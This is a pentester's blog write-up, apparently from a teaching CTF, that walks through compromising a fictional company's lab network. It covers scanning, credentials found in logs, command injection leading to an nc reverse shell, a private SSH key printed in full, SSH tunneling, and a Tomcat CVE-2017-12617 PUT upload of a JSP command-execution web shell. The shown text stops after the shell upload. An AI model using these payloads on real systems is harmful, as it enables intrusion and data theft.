@@ -1,0 +1,1068 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <title>
+    ZedCorp Challenge - My name is Rookie // Personnal security blog
+  </title>
+
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.54.0" />
+
+  <meta property="og:title" content="ZedCorp Challenge - My name is Rookie" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:url" content="https://thibaudrobin.github.io/writeups/hacklab-esgi-2019/zedcorp/" />
+
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.4.0/jquery.fancybox.min.css" />
+  
+  
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
+  
+  
+
+  <link rel="stylesheet" href="https://thibaudrobin.github.io//css/redlounge.css">
+  <link href="//use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet">
+  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
+  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">
+
+  
+  <link href="" rel="alternate" type="application/rss+xml" title="Personnal security blog" />
+
+    
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+
+  <script src="//code.jquery.com/jquery-3.3.1.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/lightbox.css">
+  <script src="https://thibaudrobin.github.io//js/lightbox.min.js"></script>
+  <script src="https://thibaudrobin.github.io//js/termynal.js"></script>
+  <script src="https://thibaudrobin.github.io//js/emojify.min.js"></script>
+  
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/termynal.css">
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/hover.css">
+  <link rel="stylesheet" type="text/css" href="https://thibaudrobin.github.io//css/emojify.min.css">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133286401-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-133286401-1');
+</script>
+
+  
+
+  
+
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', "UA-133286401-1", 'auto');
+  ga('send', 'pageview');
+</script>
+
+</head>
+
+<body>
+	
+
+	<div id="layout" class="pure-g">
+    <div class="sidebar pure-u-1 pure-u-md-1-4">
+  <div class="header">
+    
+
+	
+	  <img src="/img/moi.jpg" class="sidebarphoto">
+	
+
+    <h1 class="brand-title">Thibaud Robin</h1>
+    <h2 class="brand-tagline">Alias Th1b4ud</h2>
+    <h2 class="brand-tagline">PENTESTER</h2>
+    <p>Personnal blog to speak about cybersecurity, technology and much more !</p>
+
+    <nav class="nav">
+      <ul class="nav-list">
+        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://thibaudrobin.github.io/">Home</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/whoami">WHOAMI</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/writeups">WRITEUPS</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/articles">ARTICLES</a></li>
+        
+      </ul>
+    </nav>
+
+    
+    <div class="social-buttons">
+      
+        
+        <a href="https://github.com/thibaudrobin" target="_blank"><i class='fab fa-github'></i></a>
+        
+      
+        
+        <a href="https://gitlab.com/thibaud.robin" target="_blank"><i class='fab fa-gitlab'></i></a>
+        
+      
+        
+        <a href="https://www.linkedin.com/in/thibaud-robin/" target="_blank"><i class='fab fa-linkedin'></i></a>
+        
+      
+        
+        <a href="https://www.root-me.org/Th1b4ud/" target="_blank"><i class='root-me'></i></a>
+        
+      
+        
+        <a href="https://twitter.com/th1b4ud" target="_blank"><i class='fab fa-twitter'></i></a>
+        
+      
+      
+    </div>
+    
+
+  </div>
+</div>
+
+	
+	
+
+    <div class="content pure-u-1 pure-u-md-3-4">
+		<a name="top"></a>
+		
+
+		
+			
+		    <div id="toc" class="pure-u-1 pure-u-md-1-4">
+				<small class="toc-label">Contents</small>
+		   	 	<nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#step-1-informations-gathering">Step 1 : Informations gathering</a></li>
+<li><a href="#step-2-credentials-in-logs">Step 2 : Credentials in logs</a></li>
+<li><a href="#step-3-dev-server-admin-panel-compromission">Step 3 : dev-server admin panel compromission</a></li>
+<li><a href="#step-4-rce-on-dev-server">Step 4 : RCE on dev-server</a></li>
+<li><a href="#step-5-grab-forgotten-sensitive-informations">Step 5 : Grab forgotten sensitive informations</a></li>
+<li><a href="#step-6-internal-network-discovery">Step 6 : Internal network discovery</a>
+<ul>
+<li><a href="#admin-server-admin-server-zedcorp-10-0-0-3">Admin server - admin-server.zedcorp - 10.0.0.3</a></li>
+<li><a href="#project-server-project-server-zedcorp-10-0-0-2">Project server - project-server.zedcorp - 10.0.0.2</a></li>
+</ul></li>
+<li><a href="#step-7-rce-on-project-server">Step 7 : RCE on project-server</a></li>
+<li><a href="#step-8-bash-history-permission-mistake">Step 8 : Bash history permission mistake</a></li>
+<li><a href="#step-9-access-to-admin-server-s-ftp-service">Step 9 : Access to admin-server&rsquo;s FTP service</a></li>
+<li><a href="#step-10-access-to-admin-server-s-admin-platform">Step 10 : Access to admin-server&rsquo;s admin platform</a></li>
+<li><a href="#step-11-access-to-ceo-s-session">Step 11 : Access to CEO&rsquo;s session</a></li>
+<li><a href="#step-12-download-confidential-projects">Step 12 : Download confidential projects</a></li>
+</ul></li>
+</ul>
+</nav>
+		    </div>
+		    
+	    
+  		<section class="post">
+            <h1 class="post-title">
+              <a href="/writeups/hacklab-esgi-2019/zedcorp/">ZedCorp Challenge - My name is Rookie</a>
+						</h1>
+						
+            
+            	<span class="post-date">
+                	<span class="post-date-day"><sup>6</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Apr</span> <span class="post-date-year">2019</span>
+            	</span>
+            	
+            
+            	
+            
+
+			
+			
+				<div class="post-categories">
+				
+					<a class="post-category post-category-writeups" href="https://thibaudrobin.github.io//categories/writeups">Writeups</a>
+				
+					<a class="post-category post-category-ctf" href="https://thibaudrobin.github.io//categories/ctf">CTF</a>
+				
+					<a class="post-category post-category-hacklab-esgi-ctf-2019" href="https://thibaudrobin.github.io//categories/hacklab-esgi-ctf-2019">Hacklab-ESGI-CTF-2019</a>
+				
+				</div>
+			
+
+			
+
+			
+
+            
+
+<p>The ZedCorp challenge alias &ldquo;My name is Rookie&rdquo; was a realistic challenge proposed at Hacklab ESGI CTF 2019. ZedCorp is a small startup who work in computer science and particulary in development. The goal was to recover confidential files owned by the CEO.</p>
+
+<p>For this challenge, I wanted to teach challengers the principle of SSH tunneling and basics of penetration testing.</p>
+
+<p>Writeups wrote by others challengers (too many writeups you are mad &lt;3) :</p>
+
+<p><a href="https://github.com/ishusoka/CTF_ESGI/blob/master/MyNameIsRookie_WriteUp.md">https://github.com/ishusoka/CTF_ESGI/blob/master/MyNameIsRookie_WriteUp.md</a>
+<a href="https://ctfshellclub.github.io/2018/04/06/esgisecurityday-My-Name-is-Rookie/">https://ctfshellclub.github.io/2018/04/06/esgisecurityday-My-Name-is-Rookie/</a>
+<a href="https://gist.github.com/vonKrafft/12c4b1c4a486200aff2a5049328d0c94">https://gist.github.com/vonKrafft/12c4b1c4a486200aff2a5049328d0c94</a></p>
+
+<p><img src="/img/hacklab-esgi-2019/0.png" alt="" /></p>
+
+<h2 id="step-1-informations-gathering">Step 1 : Informations gathering</h2>
+
+<p><em><strong>Nb : For the following Write-up we’ll use the local address 192.168.122.22 , you can consider that it’s ctf.hacklab-esgi.org.</strong></em></p>
+
+<p>The only information we have is a subdomain name : <code>ctf.hacklab-esgi.org</code></p>
+
+<p>We already have the following information :</p>
+
+<pre><code>http = ctf.hacklab-esgi.org:5008 
+ssh = ctf.hacklab-esgi.org:5007
+</code></pre>
+
+<p>First thing to do is to collect some informations about the target. Let&rsquo;s launch a port scan.</p>
+
+<pre><code class="language-bash">[th1b4ud@th1b4ud-pc]$ sudo nmap -v -A -O -sT 192.168.122.22
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-21 16:22 CET
+
+Discovered open port 22/tcp on 192.168.122.22
+Discovered open port 80/tcp on 192.168.122.22
+
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
+| ssh-hostkey: 
+    [...]
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: 403 Forbidden
+</code></pre>
+
+<p>The scan return severals informations :</p>
+
+<ul>
+<li><p>2 ports are open :</p>
+
+<ul>
+<li><strong>22</strong> with ssh service. The service header indicate that the ssh server is OpenSSH 7.4 running on Debian9 linux OS.</li>
+<li><strong>80</strong> with web service. The service header indicate that the web server is Apache running under version 2.4.25 on Debian.</li>
+</ul></li>
+
+<li><p>All others ports are closed.</p></li>
+</ul>
+
+<p>Nmap return <code>http-title: 403 Forbidden</code> which could indicate that the web server is under WAF or something else who block request from nmap useragent. Let&rsquo;s check.</p>
+
+<pre><code class="language-bash">[th1b4ud@th1b4ud-pc]$ wafw00f 192.168.122.22 
+
+                                 ^     ^
+        _   __  _   ____ _   __  _    _   ____
+       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
+      | V V // o // _/ | V V // 0 // 0 // _/
+      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
+                                &lt;
+                                ...'
+
+    WAFW00F - Web Application Firewall Detection Tool
+
+    By Sandro Gauci &amp;&amp; Wendel G. Henrique
+
+Checking http://192.168.122.22
+The site http://192.168.122.22 is behind a ModSecurity (OWASP CRS)
+Number of requests: 11
+</code></pre>
+
+<p>Indeed the web server is behind a ModSecurity.</p>
+
+<p>The website is ostensibly a simple one page statice website under construction</p>
+
+<p><img src="/img/hacklab-esgi-2019/1.png" alt="website" /></p>
+
+<p>First thing to do is to launch an application scan to do a first analyse.</p>
+
+<pre><code>[th1b4ud@th1b4ud-pc]$ nikto -h 192.168.122.22
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.122.22
++ Target Hostname:    192.168.122.22
++ Target Port:        80
++ Start Time:         2019-03-21 16:46:38 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.25 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ All CGI directories 'found', use '-C none' to test none
++ OSVDB-3268: /logs/: Directory indexing found.
++ OSVDB-3092: /logs/: This might be interesting...
+</code></pre>
+
+<p>Nikto detect a directory with content readable.</p>
+
+<p>The website have a <code>robots.txt</code> with the same directory and some others.</p>
+
+<p><img src="/img/hacklab-esgi-2019/2.png" alt="robots.txt" /></p>
+
+<h2 id="step-2-credentials-in-logs">Step 2 : Credentials in logs</h2>
+
+<p>There is no interesting informations in all others directory. Let&rsquo;s check the content of <code>/logs</code> directory</p>
+
+<p><img src="/img/hacklab-esgi-2019/3.png" alt="logs" /></p>
+
+<p>Humm ! They are some access logs ! Maybe they come from of the webserver.</p>
+
+<p><img src="/img/hacklab-esgi-2019/4.png" alt="" /></p>
+
+<p>There is some interesting informations in <code>/logs/access.log</code></p>
+
+<p>2 pages and 1 directory</p>
+
+<ul>
+<li><code>/login.php</code></li>
+<li><code>/0cc175b9c0f1b6a831c399e269772661/</code></li>
+<li><code>/0cc175b9c0f1b6a831c399e269772661/admin.php</code></li>
+</ul>
+
+<p>Classic login page for <code>login.php</code></p>
+
+<p><img src="/img/hacklab-esgi-2019/5.png" alt="" /></p>
+
+<p>And redirection when we try to reach <code>admin.php</code>. Maybe we need to have a specific session.</p>
+
+<p><img src="/img/hacklab-esgi-2019/6.png" alt="" /></p>
+
+<h2 id="step-3-dev-server-admin-panel-compromission">Step 3 : dev-server admin panel compromission</h2>
+
+<p>If we look closer to <code>/logs</code> directory, we see an other type of logs : <code>/logs/access-details.log</code>. This is access log provided by the WAF ModSecurity.</p>
+
+<p><img src="/img/hacklab-esgi-2019/7.png" alt="" /></p>
+
+<p>The particularity of this access log is it write the full HTTP request submitted to the webserver (and not only the url like classic access log). So we can have some informations like request data or cookie.</p>
+
+<p>At the start of the file we see a HTTP POST request on <code>/login.php</code> file with credentials <code>test:test</code> but they don&rsquo;t work on the login page. Let&rsquo;s search deeper.</p>
+
+<p>Here is all credentials submitted to <code>/login.php</code> in this log page</p>
+
+<pre><code>username=test&amp;password=test
+username=admin&amp;password=admin
+username=admin&amp;password=pxrAW7a4HNMBw86bc
+</code></pre>
+
+<p>The last couple of credentials is correct and permit to access to the admin panel.</p>
+
+<p><img src="/img/hacklab-esgi-2019/8.png" alt="" /></p>
+
+<p>The page give us some informations about the admin panel functionnalities. If we click on show button, the page give us some data.</p>
+
+<p><img src="/img/hacklab-esgi-2019/9.png" alt="" /></p>
+
+<p>There is access log information of the current webserver. If we look closer on BurpSuite we can see that HTTP POST request contain parameter <code>log=access.log</code></p>
+
+<p><img src="/img/hacklab-esgi-2019/10.png" alt="" /></p>
+
+<h2 id="step-4-rce-on-dev-server">Step 4 : RCE on dev-server</h2>
+
+<p><code>access.log</code> seems to be a file system. We know server is a Debian OS based on Linux. We can try to display others files like <code>/etc/passwd</code>.</p>
+
+<p><img src="/img/hacklab-esgi-2019/11.png" alt="" /></p>
+
+<p>Nice it&rsquo;s work ! Let&rsquo;s do some fuzzing.</p>
+
+<p><img src="/img/hacklab-esgi-2019/12.png" alt="" /></p>
+
+<p>Some protections are on. But strange, we are not blocked by the ModSecurity. Maybe the developper deactived it to not be annoyed in developpment. Let&rsquo;s fuzz harder.</p>
+
+<p><img src="/img/hacklab-esgi-2019/13.png" alt="" /></p>
+
+<p>Oh ! Look at it ! Developper use shell function to read the access log ! We have a command injection. Nice :D</p>
+
+<p>Let&rsquo;s get a reverse shell.</p>
+
+<p>Injection : <code>access.log &amp;&amp; nc -e /bin/bash 192.168.122.1 4444</code></p>
+
+<p><img src="/img/hacklab-esgi-2019/14.png" alt="" /></p>
+
+<p>Nice <code>nc</code> is installed. IZI pwn :D</p>
+
+<p><img src="/img/hacklab-esgi-2019/15.png" alt="" /></p>
+
+<h2 id="step-5-grab-forgotten-sensitive-informations">Step 5 : Grab forgotten sensitive informations</h2>
+
+<p>2 users are available in the <code>/etc/passwd</code> file. This is time to search on the server some informations.</p>
+
+<p><img src="/img/hacklab-esgi-2019/16.png" alt="" /></p>
+
+<p>We can grab some network informations in <code>/etc/hosts</code> file</p>
+
+<pre><code>www-data@dev-server:/var/www/html/0cc175b9c0f1b6a831c399e269772661$ cat /etc/hosts
+
+127.0.0.1	localhost
+127.0.1.1	dev-server
+
+10.0.0.1	dev-server 		dev-server.zedcorp
+10.0.0.2	project-server 	project-server.zedcorp
+10.0.0.3	admin-server	admin-server.zedcorp
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre>
+
+<p>And file <code>/etc/network/interfaces</code></p>
+
+<pre><code>www-data@dev-server:/var/www/html/0cc175b9c0f1b6a831c399e269772661$ cat /etc/network/interfaces
+              
+# This file describes the network interfaces available on your system
+# and how to activate them. For more information, see interfaces(5).
+
+source /etc/network/interfaces.d/*
+
+# The loopback network interface
+auto lo
+iface lo inet loopback
+
+auto enp1s0
+iface enp1s0 inet dhcp
+
+auto enp7s0
+iface enp7s0 inet static
+	address 10.0.0.1
+	netmask 255.255.0.0
+	network 10.0.0.0
+	broadcast 10.0.255.255
+	dns-domain zedcorp
+	dns-search zedcorp
+</code></pre>
+
+<p>What can we learn with these files ?</p>
+
+<ul>
+<li>The internal network have static ip adress in <code>10.0.0.0/16</code></li>
+<li>The domain is <code>zedcorp</code></li>
+<li>There is 3 machines in the network
+
+<ul>
+<li>The machine we pwned : <code>10.0.0.1 - dev-server - dev-server.zedcorp</code></li>
+<li>Second server : <code>10.0.0.2 - project-server - project-server.zedcorp</code></li>
+<li>Third server (maybe documents are on this one) : <code>10.0.0.3 - admin-server - admin-server.zedcorp</code></li>
+</ul></li>
+</ul>
+
+<p>So we need to have a better access to the <code>dev-server</code> if we want to go deeper in the internal network.</p>
+
+<p>What is the user <code>test</code> seen in <code>/etc/passwd</code> ? Deactivate account. Weird. Let&rsquo;s check is own home (if we can).</p>
+
+<pre><code>www-data@dev-server:/home/test$ ls -al
+
+total 28
+drwxr-xr-x 3 test test 4096 Mar 10 23:16 .
+drwxr-xr-x 4 test test 4096 Mar 18 15:20 ..
+-rwxr-xr-x 1 test test    1 Mar 10 23:23 .bash_history
+-rwxr-xr-x 1 test test  220 Mar 10 23:07 .bash_logout
+-rwxr-xr-x 1 test test 3526 Mar 10 23:07 .bashrc
+-rwxr-xr-x 1 test test  675 Mar 10 23:07 .profile
+drwxr-xr-x 2 test test 4096 Mar 10 23:16 .ssh
+</code></pre>
+
+<p>Ho, <code>.ssh</code> folder. And look at this rights. The user may have done something like <code>chmod 755 *</code> because we can read the file <code>.bash_history</code>. Or maybe <code>chmod -R 755 *</code> ? What a bad practice&hellip;</p>
+
+<p>Let&rsquo;s check <code>.ssh</code> directory.</p>
+
+<pre><code>www-data@dev-server:/home/test/.ssh$ ls -al
+
+total 20
+drwxr-xr-x 2 test test 4096 Mar 10 23:16 .
+drwxr-xr-x 3 test test 4096 Mar 10 23:16 ..
+-rwxr-xr-x 1 test test  401 Mar 10 23:16 authorized_keys
+-rwxr-xr-x 1 test test 1679 Mar 10 23:09 id_rsa
+-rwxr-xr-x 1 test test  401 Mar 10 23:09 id_rsa.pub
+</code></pre>
+
+<p>Hahaha ! That what I said ! We can read his private ssh key !</p>
+
+<pre><code>www-data@dev-server:/home/test/.ssh$ cat id_rsa
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA1f3hWbx2726sOiwm+gg8Td2261E7QSJhQHcQFEns7Ubonx6E
++YU4BgzQt136gK42RwoGOph8H/Tu0zfjGIx9IQOIDG8VmCItfUDFCexoqoZB2cj2
+9sLKgA/VZqRJiSka1+uibcyIgFnyDegbSXt42J6XL6xZaT56aq539s8M/aFSWNEf
+8yTBG7k4E0ZWqexBhXDK3rNJ1veH3EcJXBjYgitDLXSS/VPE7op6MlD5q7ZdNt28
+45idJ5tT+U8xrht71oGiIswxi1dXz0VvjXOIJIk1iQIyRdiGIvPpHIY+Dxw2FTHo
+pi7Z3M5hjoq36LQryHjVbUVaUrvkyeQtZXeDIQIDAQABAoIBAHloJrhAwsGo6rG+
+ZwaoMX6D8cmkNpgHp2Fpq4e3QWKFPmk4aX0fZd+Y2bmO6hajwEuhllMcPB/tWKoh
+JQjCfCOE22UiiP/dNC3B14h/xgopTab/642oijcJxKsNPmNBHOev2mGtDyyy2y+k
+pgaUtMVBhMkZYUjil5V7ErjGU7p5CCqeZUditEMKq9eAAq8oNGq84L0ZKqx4dyPN
+Ai36I8Nygk1SpYBod+K7lUYDDfd+ZPR/yEVhfHP9JqLdezfpeJW7SQvgc4Fb0rEY
++tvM0IfyIR/9tB7IrfNuXG6S+UjoP5eybasUMDn0sqSGYLfaq1pFZYolneDkrpeV
+9mPBoAECgYEA+LJUBHTrdKWqxtwkugg05Iu5nEMTGhUmZ4b6x2MRGeadqPF6u9+R
+0eubqX+oNWAKBgtHQSzE8faLnOJ6lc2oEN6jeukCDStYg//aIaEyZf2r/uBs0+zA
+QNO8CQ5dXK5sowaFPgqXZ0mIFUmtDOgSm6M3IRc4BK6nYlxClVzTs4ECgYEA3Eal
+GLMBNykaR0jCD1CartiTZay6ld1rCZVJWjONDgJGtzi0tW1j7Mr5jk0dwfp7cJVu
+/Dx+sc4Om/nJ3h15pvvcrKnv0kPhqXX4h+dFmz2psTKmjYjpsff0eLRJS9JHVNEb
+svu/zHqzzrRsm1un3Ikcvy0lnG31sg6kJ8EXH6ECgYEApe/Wv2KD+EDRwf4BQ19W
+a2gPYIQgqraR+WHG0mL3diC58Y+uJMz3rulV47KZuYNrLL05vfLxNcEbRoKW6H1g
+NmFXExuFkuPpG6oLEYVM62Bm8pksA/tkC907CY/cG4sGUYB4Rv0qKHCXrByMqp/u
+SoqMrjef2P/wD2EfzCkz2AECgYBIr98m6VrLUvri7vVqjFSewcTR1k+zyF7byLFt
+3Hj9WG7xYvruq2w/5TK4bGYXbopxOj5naab9EVvsyF5+twc/vPiy2VjT76Z1fwJG
+BmEHuy9V07r2FWnYWlQHyKYvKPJ04JPdWgmOdicDXLJCCdq4gV5FD6bLmdVrrj0p
+CSSSQQKBgQCI3TUMYeR/4+86B6i2sldPVtn52QrOHeaDwRfZ1Z7TRYPY6gIvKBLd
+VVU6YcP0KwZUHeUOC7qNxSCTnB7FkANad+D/7a0MGqAGCmWChS5GD6zpqhW+tKkY
+zc9Ur+20TJHIwAKloaZLiMdcpdyFUQQRStXCGD6wqbw8UxGfx1Fd0g==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<p>Perfect ! We have our access.</p>
+
+<h2 id="step-6-internal-network-discovery">Step 6 : Internal network discovery</h2>
+
+<p><img src="/img/hacklab-esgi-2019/17.png" alt="" /></p>
+
+<p>As we saw in <code>/etc/passwd</code> the user <code>test</code> have <code>/usr/sbin/nologin</code> as shell. It means that user <code>test</code> can&rsquo;t have a shell on the server. But you can do a SSH tunnel without shell. With this technique you will be able to reach the internal network.</p>
+
+<p>You can use this command to do a dynamic SSH tunnel : <code>ssh -D 9050 test@192.168.122.22 -i id_rsa -N</code></p>
+
+<p>You can check that tunnel is correclty launched with netstat (or ss) command</p>
+
+<pre><code>[th1b4ud@th1b4ud-pc]$ sudo netstat -ntpl
+tcp6       0      0 ::1:9050                :::*                    LISTEN      28403/ssh
+</code></pre>
+
+<p>The hint <code>[HINT] : Do you know proxychains ?</code> on the login prompt guide you to use a specific tool</p>
+
+<p>Proxychains permit to run any program through proxy server. Our proxy server is our SSH tunnel. So proxychains permit us to redirect all our traffic trought the SSH tunnel. So if type this command <code>proxychains ping 10.0.0.2</code> this will send my ping throught the SSH tunnel and reach the internal server with ip <code>10.0.0.2</code></p>
+
+<p>In default proxychains will redirect all traffic to port 9050 (habitually used by TOR Proxy). So thats why I open the SSH tunnel on local port 9050.</p>
+
+<p>So you can now map the internal and confirm the informations collected in <code>/etc/hosts</code> file.</p>
+
+<pre><code>[th1b4ud@th1b4ud-pc]$ proxychains -q nmap project-server.zedcorp
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-23 15:42 CET
+Nmap scan report for 10.0.0.2
+Host is up (0.00049s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8009/tcp open  ajp13
+8080/tcp open  http-proxy
+
+
+[th1b4ud@th1b4ud-pc]$ proxychains -q nmap admin-server.zedcorp
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-23 15:46 CET
+Nmap scan report for 10.0.0.3
+Host is up (0.00073s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
+</code></pre>
+
+<p>Here is a summary of the network architecture.</p>
+
+<p><img src="arc/img/hacklab-esgi-2019/hi.png" alt="" /></p>
+
+<p>I use BurpProxy to inspect my HTTP traffic so I can easily inspect and repeat HTTP query.</p>
+
+<p><img src="bu/img/hacklab-esgi-2019/rp.png" alt="" /></p>
+
+<p><img src="/img/hacklab-esgi-2019/18.png" alt="" /></p>
+
+<p>The next step is to discover and understand services on the two internals servers.</p>
+
+<h3 id="admin-server-admin-server-zedcorp-10-0-0-3">Admin server - admin-server.zedcorp - 10.0.0.3</h3>
+
+<p>This could be our target. The confidentials documents are maybe stored on this server. What are the services exposed ?</p>
+
+<ul>
+<li>FTP in port 21</li>
+<li>SSH in port 22</li>
+<li>Web server in port 80</li>
+</ul>
+
+<p>The web server is a Nginx. It&rsquo;s protected by BasicAuth. We need to find credentials.</p>
+
+<p><img src="/img/hacklab-esgi-2019/19.png" alt="" /></p>
+
+<p>The FTP server is a VSFTPd. It&rsquo;s also protected by login (anynmous login is not available). Need to find credentials too.</p>
+
+<pre><code>[th1b4ud@th1b4ud-pc]$ proxychains -q ftp 10.0.0.3
+
+Connected to 10.0.0.3.
+220 (vsFTPd 3.0.3)
+Name (10.0.0.3:th1b4ud): admin
+530 Permission denied.
+ftp: Login failed.
+ftp&gt; 
+</code></pre>
+
+<h3 id="project-server-project-server-zedcorp-10-0-0-2">Project server - project-server.zedcorp - 10.0.0.2</h3>
+
+<p>10.0.0.2 - project-server.zedcorp is the second server alive on the internal network. Maybe there is some informations on this one.</p>
+
+<p>Services exposes are :</p>
+
+<ul>
+<li>SSH on port 22</li>
+<li>AJP on port 8009</li>
+<li>Web server on port 8080</li>
+</ul>
+
+<h2 id="step-7-rce-on-project-server">Step 7 : RCE on project-server</h2>
+
+<p>What is AJP ?</p>
+
+<p>&ldquo;<em>AJP Connectors work in the same way as HTTP Connectors, but they use the AJP protocol in place of HTTP. Apache JServ Protocol, or AJP, is an optimized binary version of HTTP that is typically used to allow Tomcat to communicate with an Apache web server.</em>&ldquo;</p>
+
+<p>Humm Apache Tomcat ? 8009 and 8080 ? There are defaults ports on Apache Tomcat. Maybe there is a vulnerability to exploit. Let&rsquo;s check the web server.</p>
+
+<p><img src="/img/hacklab-esgi-2019/20.png" alt="" /></p>
+
+<p>Ok so this server is used to manage all projects of the company. There is some interesting tasks on this kanban application.</p>
+
+<ul>
+<li>The admin-server have a admin platform which under development.</li>
+<li>The CEO session in admin platform need more functionnality.</li>
+<li>It may remain some sensible informations on project-server (maybe on users home).</li>
+</ul>
+
+<p>So let&rsquo;s search deeper.</p>
+
+<p>We know that application is running with Apache Tomcat. But what is the version ? By default, it&rsquo;s really simple to know it. It&rsquo;s displayed on error pages.</p>
+
+<p><img src="/img/hacklab-esgi-2019/21.png" alt="" /></p>
+
+<p>Yeah ! Got it !</p>
+
+<p>The information is also available on <code>/docs</code></p>
+
+<p><img src="/img/hacklab-esgi-2019/22.png" alt="" /></p>
+
+<p>Let&rsquo;s check the version on exploitdb with tool <code>searchsploit</code></p>
+
+<p><img src="/img/hacklab-esgi-2019/23.png" alt="" /></p>
+
+<p>Ho JSP Bypass Upload. Let&rsquo;s check the exploit : CVE 2017-12617 : <a href="https://www.exploit-db.com/exploits/">https://www.exploit-db.com/exploits/</a></p>
+
+<p>So the exploit is a simple PUT request. Tomcat will receive and write the requested data on the server. Let&rsquo;s try to obtain a reverse shell.</p>
+
+<p>First we need to find free filename. Here the filename <code>exploit.jsp</code> is free. Let&rsquo;s use
+it.</p>
+
+<p><img src="/img/hacklab-esgi-2019/24.png" alt="" /></p>
+
+<p>HTTP payload</p>
+
+<pre><code>PUT /exploit.jsp/ HTTP/1.1
+Host: 192.168.122.201:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,pl;q=0.6
+Connection: close
+Content-Length: 4
+
+&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;
+&lt;%
+	if (request.getParameter(&quot;cmd&quot;) != null) {
+		out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;br&gt;&quot;);
+		Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+		OutputStream os = p.getOutputStream();
+		InputStream in = p.getInputStream();
+		DataInputStream dis = new DataInputStream(in);
+		String disr = dis.readLine();
+
+		while(disr != null) {
+			out.println(disr); 
+			disr = dis.readLine(); 
+		}
+	}
+%&gt;
+</code></pre>
+
+<p><img src="/img/hacklab-esgi-2019/25.png" alt="" /></p>
+
+<p>YEAH ! 201 CREATED !</p>
+
+<p><img src="/img/hacklab-esgi-2019/26.png" alt="" /></p>
+
+<p>We are in !</p>
